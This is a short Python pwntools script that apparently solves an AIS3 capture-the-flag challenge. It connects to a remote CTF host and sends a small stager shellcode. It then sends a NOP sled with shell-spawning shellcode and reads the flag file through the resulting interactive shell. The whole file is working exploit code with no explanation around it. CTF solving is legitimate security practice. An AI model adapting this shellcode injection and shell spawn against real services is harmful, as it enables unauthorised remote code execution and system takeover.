#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

host = 'srv01.ctf.ais3.org'
port = 5522

y = remote( host , port )


y.send( '\xff\xf4' + asm( 'pop rsi; syscall' ) )

sleep(0.1)

y.send( '\x90' * 0x10 + asm( shellcraft.sh() ) )

sleep(0.1)

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()